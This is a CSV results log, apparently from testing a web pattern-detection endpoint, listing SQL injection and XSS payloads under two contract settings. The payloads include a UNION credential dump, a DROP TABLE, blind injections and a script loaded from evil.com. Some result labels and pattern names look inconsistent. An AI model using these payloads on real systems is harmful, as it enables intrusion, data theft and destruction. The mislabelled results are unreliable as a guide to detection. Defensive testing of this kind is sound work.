timestamp,attack_type,description,payload,contract_type,expected_gunicorn_block,result,http_status,http_handler,response_body
2025-10-13T15:11:44.196276,SQLi,Classic Tautology,' OR 1=1--,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:11:44.201666,SQLi,Classic Tautology,' OR 1=1--,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:11:44.308011,SQLi,Tautology with Comment,' OR 'a'='a,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:11:44.310433,SQLi,Tautology with Comment,' OR 'a'='a,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:11:44.417507,SQLi,Boolean-based Blind,AND 1=1,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:11:44.426322,SQLi,Boolean-based Blind,AND 1=1,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:11:44.535866,SQLi,UNION Statement,"UNION SELECT user, password FROM users",Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:11:44.544432,SQLi,UNION Statement,"UNION SELECT user, password FROM users",Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:11:44.651883,SQLi,Stacked Query,'; DROP TABLE members;--,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:11:44.654490,SQLi,Stacked Query,'; DROP TABLE members;--,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:11:44.761726,SQLi,Error-based,"OR 1=CAST(CONCAT(0x7e,(SELECT user())) AS SIGNED)",Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Comments/Bypass"", ""status"": ""pattern_received""}"
2025-10-13T15:11:44.768817,SQLi,Error-based,"OR 1=CAST(CONCAT(0x7e,(SELECT user())) AS SIGNED)",Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Comments/Bypass"", ""status"": ""pattern_received""}"
2025-10-13T15:11:44.878371,SQLi,Time-based Blind,"OR IF(1=1, SLEEP(5), 0)",Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:11:44.886294,SQLi,Time-based Blind,"OR IF(1=1, SLEEP(5), 0)",Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:11:44.994040,SQLi,Authentication Bypass,admin'--,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:11:45.000053,SQLi,Authentication Bypass,admin'--,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:11:45.107557,SQLi,Double Quote Tautology,""" OR 1=1--",Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:11:45.114093,SQLi,Double Quote Tautology,""" OR 1=1--",Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:11:45.222249,SQLi,Wildcard Bypass,' OR '%'=',Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:11:45.228972,SQLi,Wildcard Bypass,' OR '%'=',Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:11:45.336693,XSS,Basic Script Tag,<script>alert('XSS')</script>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:11:45.342848,XSS,Basic Script Tag,<script>alert('XSS')</script>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:11:45.451828,XSS,Image OnError,<img src=x onerror=alert(document.cookie)>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:11:45.458317,XSS,Image OnError,<img src=x onerror=alert(document.cookie)>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:11:45.563984,XSS,Body OnLoad,<body onload=alert(1)>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:11:45.570454,XSS,Body OnLoad,<body onload=alert(1)>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:11:45.676353,XSS,SVG OnLoad,<svg/onload=alert(1)>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:11:45.679734,XSS,SVG OnLoad,<svg/onload=alert(1)>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:11:45.787121,XSS,Iframe Source,"<iframe src=""javascript:alert(1)"">",Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:11:45.794291,XSS,Iframe Source,"<iframe src=""javascript:alert(1)"">",Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:11:45.901503,XSS,Case Insensitive,<ScRiPt>alert(1)</sCrIpT>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:11:45.907906,XSS,Case Insensitive,<ScRiPt>alert(1)</sCrIpT>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:11:46.016948,XSS,No Closing Tag,<script src=http://evil.com/xss.js>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:11:46.023274,XSS,No Closing Tag,<script src=http://evil.com/xss.js>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:11:46.133021,XSS,Anchor Href,"<a href=""javascript:alert(1)"">Click me</a>",Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:11:46.141527,XSS,Anchor Href,"<a href=""javascript:alert(1)"">Click me</a>",Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
